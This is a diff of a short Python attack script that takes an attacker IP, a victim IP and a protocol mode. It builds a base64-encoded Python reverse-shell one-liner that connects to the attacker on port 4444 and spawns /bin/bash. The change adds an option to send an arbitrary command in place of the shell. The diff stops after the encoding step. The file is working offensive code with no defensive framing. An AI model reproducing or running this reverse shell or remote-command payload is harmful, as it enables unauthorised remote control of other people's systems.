@@ -1,15 +1,19 @@
 import base64, sys, subprocess
 
-if (len(sys.argv) != 4):
-    print("args format: [your ip] [victim ip] [http or https]")
+if (len(sys.argv) < 4):
+    print("args format: [your ip] [victim ip] [http or https] [optional: command]")
     sys.exit(-1)
 
 your_ip = sys.argv[1]
 victim_ip = sys.argv[2]
 mode = sys.argv[3]
 
-# encode the ip
-text = f"""START:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{your_ip}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
+# if command given, run that command
+if (len(sys.argv) == 5):
+    text = "START:" + sys.argv[4]
+else: 
+    # encode the ip
+    text = f"""START:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{your_ip}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
 encoded_bytes = base64.b64encode(text.encode("utf-8"))
 encoded_str = encoded_bytes.decode("ascii")
 
